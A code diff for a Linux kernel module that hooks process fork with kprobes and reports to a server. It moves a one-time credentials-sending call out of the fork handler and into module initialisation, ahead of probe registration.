@@ -30,21 +30,8 @@ static struct kprobe kps[PROBES_SIZE] = {
 
 /* Fork hook */
 static int handler_pre_do_fork(struct kprobe *kp, struct pt_regs *regs) {
-  // static atomic variable for status of credentials sent
-  static atomic_t sent_cred = ATOMIC_INIT(0);
-
   char msg_buf[BUFFER_SIZE];
   size_t msg_length;
-
-  if (atomic_cmpxchg(&sent_cred, 0, 1) == 0)
-    /*
-     * First message which needs to be sent to server is the credentials message
-     * When module firstly loaded it will not be able to call handle_credentials
-     * Due to sync issues, Therefore we must call it in a function that will be
-     * Called firstly when module starts running, when module starts running
-     * A certain process also starts working at the same time
-     */
-    handle_credentials();
 
   if (!current)
     return 0;
@@ -171,6 +158,7 @@ static int __init hook_init(void) {
     return ret;
 
   data_transmission_init();
+  handle_credentials(); // Send credentials before registering hooks
 
   /* Registers kprobes, if one fails unregisters all registered kprobes */
   ret = register_probes();
